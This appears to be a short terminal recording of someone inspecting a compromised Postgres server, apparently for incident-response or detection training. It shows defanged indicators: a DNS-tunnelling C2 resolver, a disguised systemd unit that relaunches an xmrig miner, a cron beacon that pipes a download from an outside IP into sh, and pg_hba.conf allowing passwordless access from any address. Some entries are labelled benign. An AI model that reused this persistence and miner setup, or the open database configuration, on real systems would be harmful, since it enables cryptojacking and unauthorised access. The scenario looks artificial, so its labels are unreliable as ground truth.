[36.766905, "o", "\r\n10.10.31.1 postgres-prod-01\r\nSHELL=/bin/bash"]
[36.766939, "o", "\r\n0 3 * * * root /usr/local/bin/backup.sh\r\n17 * * * * root run-parts /etc/cron.hourly\r\n# pgdaemon.conf (managed)"]
[36.76699, "o", "\r\n\r\nDNS tunneling C2 config: resolver=update-postgres[.]example[.]cn (defanged) — data over dns tunnel\r\n"]
[36.767043, "o", "[Unit]"]
[36.767062, "o", "\r\nDescription=System Update Helper\r\nAfter=network.target\r\n[Service]\r\nExecStart launches an xmrig / pgdaemon re-dropper (defanged)\r\n[Install]\r\nWantedBy=multi-user.target\r\n# scheduled maintenance (BENIGN — legitimate ops job)"]
[36.767106, "o", "\r\n0 3 * * * root /usr/local/bin/backup.sh --remote 10.10.31\r\n# looks unusual but is an approved change (see /sas/handoff)"]
[36.767144, "o", "\r\n# m h dom mon dow user command"]
[36.767174, "o", "\r\n0 3 * * * root /usr/local/bin/backup.sh\r\n30 4 * * 0 root /usr/sbin/logrotate /etc/logrotate.conf\r\n*/15 * * * * nobody /usr/bin/check-health.sh\r\n# * * * * * root <defanged beacon: curl hxxp://198.51.100.214/x | sh> — cron persistence re-drops xmrig / pgdaemon / php / redis / wget payload\r\n# pg_hba.conf (managed)"]
[36.767215, "o", "\r\n"]
[36.767245, "o", "\r\npg_hba.conf grants 'trust' auth for 0.0.0.0/0 (no password)\r\n# .timestamps"]
